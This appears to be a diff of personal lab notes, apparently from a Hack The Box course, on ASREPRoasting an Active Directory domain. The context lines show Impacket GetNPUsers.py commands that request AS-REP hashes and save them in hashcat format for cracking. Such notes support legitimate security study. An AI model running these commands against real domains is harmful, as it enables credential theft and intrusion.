@@ -1,6 +1,5 @@
 # ASREPRoast
 
-Status: Not started
 
 ### Enumerating From internal Windows
 
@@ -34,7 +33,7 @@ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_a
 python GetNPUsers.py domain_name/username:password -request -format hashcat -outputfile hashes.asreproast
 ```
 
-**Enumerating AS-REP Using Kerbrute**
+### Enumerating AS-REP Using Kerbrute
 
 ```bash
 Foresty@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
